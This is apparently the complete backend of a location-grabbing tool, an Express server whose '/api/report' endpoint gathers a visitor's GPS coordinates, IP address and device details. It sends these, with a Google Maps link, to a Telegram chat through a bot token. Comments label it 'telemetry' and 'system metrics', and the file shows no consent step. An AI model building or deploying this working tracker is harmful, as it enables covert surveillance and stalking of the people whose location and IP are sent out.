require('dotenv').config();
const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

// 🤖 Notification Service for System Metrics and Location
function sendNotification(text) {
    return new Promise((resolve) => {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            console.error("❌ Configuration Error: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
            return resolve(false);
        }

        const data = JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${token}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            },
            timeout: 10000
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                try {
                    const result = JSON.parse(body);
                    if (result.ok) {
                        console.log("✅ Alert sent successfully");
                        resolve(true);
                    } else {
                        console.error("❌ Notification failed:", result.description);
                        resolve(false);
                    }
                } catch (e) {
                    resolve(false);
                }
            });
        });

        req.on('error', (e) => {
            console.error("❌ Network error:", e.message);
            resolve(false);
        });

        req.write(data);
        req.end();
    });
}

// 🛠️ Connectivity Test Endpoint
app.get('/test', async (req, res) => {
    const ok = await sendNotification("🔔 <b>System Check:</b> Connection established!");
    if (ok) res.send("<h1>✅ Service is Online! Check Telegram.</h1>");
    else res.send("<h1>❌ Service Offline. Check Logs.</h1>");
});

// 🎯 Telemetry Data Endpoint
app.post('/api/report', async (req, res) => {
    res.status(200).send("OK");

    (async () => {
        try {
            const d = req.body;
            const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

            const report = `
📊 <b>New System Report</b>
━━━━━━━━━━━
📍 <b>Location Metrics:</b>
<code>${d.lat}, ${d.lon}</code>
🗺️ <a href="https://www.google.com/maps?q=${d.lat},${d.lon}">View coordinates</a>
🎯 <b>Accuracy:</b> ${d.acc || 'N/A'}

🌐 <b>Network:</b>
• <b>IP Address:</b> <code>${ip}</code>
• <b>Local Time:</b> ${d.time || 'N/A'}

📱 <b>Device Info:</b>
• <b>Platform:</b> ${d.plat || 'N/A'}
• <b>Screen:</b> ${d.screen || 'N/A'}
• <b>Cores:</b> ${d.cores || 'N/A'}
• <b>Memory:</b> ${d.ram || 'N/A'}
━━━━━━━━━━━`;

            await sendNotification(report);
        } catch (e) {
            console.error("Processing error:", e.message);
        }
    })();
});

app.listen(PORT, () => console.log(`🚀 السيرفر يعمل على منفذ ${PORT}`));
